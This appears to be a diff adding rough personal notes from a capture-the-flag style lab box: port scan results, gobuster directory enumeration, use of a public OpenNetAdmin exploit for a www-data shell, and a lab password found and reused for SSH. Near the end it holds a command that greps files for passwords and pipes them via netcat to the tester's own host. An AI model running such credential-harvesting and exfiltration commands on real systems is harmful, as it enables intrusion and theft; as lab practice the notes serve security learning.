@@ -1,0 +1,84 @@
+
+scanned ports
+
+port 22 and 80 are open
+several websites avialable
+
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://10.10.10.171
+[+] Threads:        10
+[+] Wordlist:       /home/scarlett/Afnom/SecLists/Discovery/Web-Content/common.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Timeout:        10s
+===============================================================
+2020/01/29 15:22:46 Starting gobuster
+===============================================================
+/.htaccess (Status: 403)
+/.hta (Status: 403)
+/.htpasswd (Status: 403)
+/artwork (Status: 301)
+/index.html (Status: 200)
+/music (Status: 301)
+/server-status (Status: 403)
+===============================================================
+2020/01/29 15:23:31 Finished
+===============================================================
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://10.10.10.171
+[+] Threads:        10
+[+] Wordlist:       /home/scarlett/Afnom/SecLists/Discovery/Web-Content/RobotsDisallowed-Top1000.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Timeout:        10s
+===============================================================
+2020/01/29 15:23:31 Starting gobuster
+===============================================================
+// (Status: 200)
+//?q=user/login/ (Status: 200)
+//?q=user/register/ (Status: 200)
+//?q=user/password/ (Status: 200)
+//?q=search/ (Status: 200)
+//?q=node/add/ (Status: 200)
+//?q=comment/reply/ (Status: 200)
+//?q=admin/ (Status: 200)
+//?q=user/logout/ (Status: 200)
+//?q=filter/tips/ (Status: 200)
+//? (Status: 200)
+//?level=12 (Status: 200)
+/?&what= (Status: 200)
+//?q=contact/ (Status: 200)
+//?q=logout/ (Status: 200)
+//?q=* (Status: 200)
+//?msk (Status: 200)
+//?favorites (Status: 200)
+//?* (Status: 200)
+===============================================================
+2020/01/29 15:23:43 Finished
+===============================================================
+Complete
+
+/artwork and /music and /sierra
+login to /music gives /ona
+
+searched for "ona v18.1.1 exploit"
+copied code found to machine
+then ran with 10.10.10.171/ona/ as $1
+gained access as www-data, a service user
+searched 
+ls ../../../home -alh
+found two users jimmy and joanna
+
+nc -l -p 9929 > password.txt; on host end
+grep -R password ./* | nc 10.10.14.35 9929
+
+Password for jimmy is: n1nj4W4rri0R!
+was able to use this to get into ssh and get a full bash terminal, thank christ!
+
+in /var/www
